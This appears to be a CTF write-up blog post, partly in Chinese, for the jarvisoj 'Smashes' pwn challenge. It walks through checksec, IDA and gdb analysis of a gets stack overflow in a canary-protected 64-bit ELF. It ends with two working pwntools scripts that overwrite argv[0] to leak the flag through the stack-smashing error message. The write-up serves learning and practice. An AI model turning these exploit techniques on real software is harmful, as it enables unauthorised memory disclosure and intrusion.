---
layout:     post
title:      jarvisoj Smashes
author:     wooy0ung
tags: 		  linux elf pwn
category:  	ctf
---


### 0x00 introduction

```
Problem Address:
https://www.jarvisoj.com

Problem Description:
Smashes, try your best to smash!!!

Download:
https://dn.jarvisoj.com/challengefiles/smashes.44838f6edd4408a53feb2e2bbfe5b229

Address:
nc pwn.jarvisoj.com 9877
```
<!-- more -->


### 0x01 file命令查看文件是64位elf格式

```
file smashes
```

![](/assets/img/ctf/pwn/2017-06-15-jarvisoj-smashes/0x00.png)

### 0x02 checksec之，发现开了Canary

```
checksec smashes
```

![](/assets/img/ctf/pwn/2017-06-15-jarvisoj-smashes/0x01.png)

### 0x03 在kali linux 2.0中执行程序
```
chmod a+x ./smashes
./smashes
```

![](/assets/img/ctf/pwn/2017-06-15-jarvisoj-smashes/0x02.png)

### 0x04 执行文件放到IDA中分析

_IO_gets函数存在溢出漏洞

![](/assets/img/ctf/pwn/2017-06-15-jarvisoj-smashes/0x03.png)

计算argv[0]到缓冲区的距离，0x218个字节

```
gdb ./smashes
b *0x0040080e
find /root
find 0x7fffffffe673
distance $rsp 0x7fffffffe3d8
```

![](/assets/img/ctf/pwn/2017-06-15-jarvisoj-smashes/0x04.png)

![](/assets/img/ctf/pwn/2017-06-15-jarvisoj-smashes/0x05.png)

查找发现flag存在0x400d20这个地址

![](/assets/img/ctf/pwn/2017-06-15-jarvisoj-smashes/0x06.png)

观察__libc_message源码，需要将LIBC_FATAL_STDERR置为非空，才能收到错误信息，否则会被redirect到_PATH_TTY

```
void __libc_message (int do_abort, const char *fmt, ...)
{
  va_list ap; 
  int fd = -1; 
  va_start (ap, fmt);
  /* Open a descriptor for /dev/tty unless the user explicitly
     requests errors on standard error.  */
  const char *on_2 = __libc_secure_getenv ("LIBC_FATAL_STDERR_");
  if (on_2 == NULL || *on_2 == '\0')
    fd = open_not_cancel_2 (_PATH_TTY, O_RDWR | O_NOCTTY | O_NDELAY);
  if (fd == -1) 
    fd = STDERR_FILENO;
  /*......*/
}
```


### 0x05 根据以上信息写成exploit

稳定版的exploit

```
#!/usr/bin/python
# -*- coding:utf8 -*-

from pwn import *
old_flag_addr = 0x600d20
new_flag_addr = 0x400d20
# Io = process('./smashes')
Io = remote('pwn.jarvisoj.com', 9877)
Io.recvuntil("name?")
payload = "a"*0x218 + p64(new_flag_addr) 
payload += p64(0) + p64(old_flag_addr)
Io.sendline(payload)
Io.recvuntil("flag: ")
env = "LIBC_FATAL_STDERR=1"
Io.sendline(env)
flag = Io.recv()
print flag
```

强行将一大片地址填充为flag的地址，不一定每次都能得到flag
```
#!/usr/bin/python
# -*- coding:utf8 -*-

from pwn import *
context.log_level = 'debug'
# Io = process('./smashes')
Io = remote('pwn.jarvisoj.com', 9877)
Io.recv()
Io.sendline(p64(0x0400d20)*300)
Io.recv()
Io.sendline()
Io.recv()
```

得到flag

![](/assets/img/ctf/pwn/2017-06-15-jarvisoj-smashes/0x07.png)
